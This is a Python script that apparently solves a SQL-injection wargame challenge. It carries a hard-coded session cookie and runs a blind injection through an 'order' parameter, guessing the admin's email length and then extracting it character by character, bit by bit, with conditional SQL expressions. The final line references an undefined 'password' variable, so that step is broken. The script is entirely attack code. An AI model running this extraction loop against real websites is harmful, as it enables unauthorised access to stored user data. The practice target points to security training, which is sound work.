import requests

def get(order):
    return requests.get(
        'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php',
        params={"order":order},
        cookies={'PHPSESSID': 'noefrhpr1bme4kn0b510mjnq01'}).text

TRUE_VAL = "<th>score</th><tr><td>admin</td><td>**************"

# get length
length = 1
while True:
    print("Try length", length)
    if TRUE_VAL in get(f"if(id='admin'&&length(email)={length},4,5)"):
        break
    length += 1
print("Length is", length)

# get char_length
char_length = 7 # by big length..

# get password
email = ''
for index in range(1, length + 1):
    tmp = ''
    for bit in range(1, char_length + 1):
        if TRUE_VAL in get(f"if(id='admin'&&mid(lpad(bin(ord(mid(email,{index},1))),{char_length},0),{bit},1),4,5)"):
           tmp += '1'
        else:
            tmp += '0'
    email += chr(int(tmp, 2))
    print(email)

# email is admin_secure_email@emai1.com

# certify
print(get(password))
